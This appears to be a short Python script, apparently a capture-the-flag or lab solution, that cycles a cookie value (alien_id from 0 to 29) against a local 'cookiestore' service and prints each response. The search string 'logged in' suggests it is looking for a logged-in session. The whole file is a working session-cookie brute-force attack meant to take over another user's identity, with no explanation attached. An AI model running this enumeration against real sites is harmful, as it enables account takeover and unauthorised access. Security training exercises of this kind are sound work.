import urllib.parse
import urllib.error
import urllib.request
flag = "logged in"
url="http://127.0.0.1:8082/cookiestore"
for x in range(0, 30):
  a_request = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0', 'Cookie':f'alien_id={x}'})
  with urllib.request.urlopen(a_request) as response:
    the_page = response.read()
    print(the_page)
    print("")
    print("")
    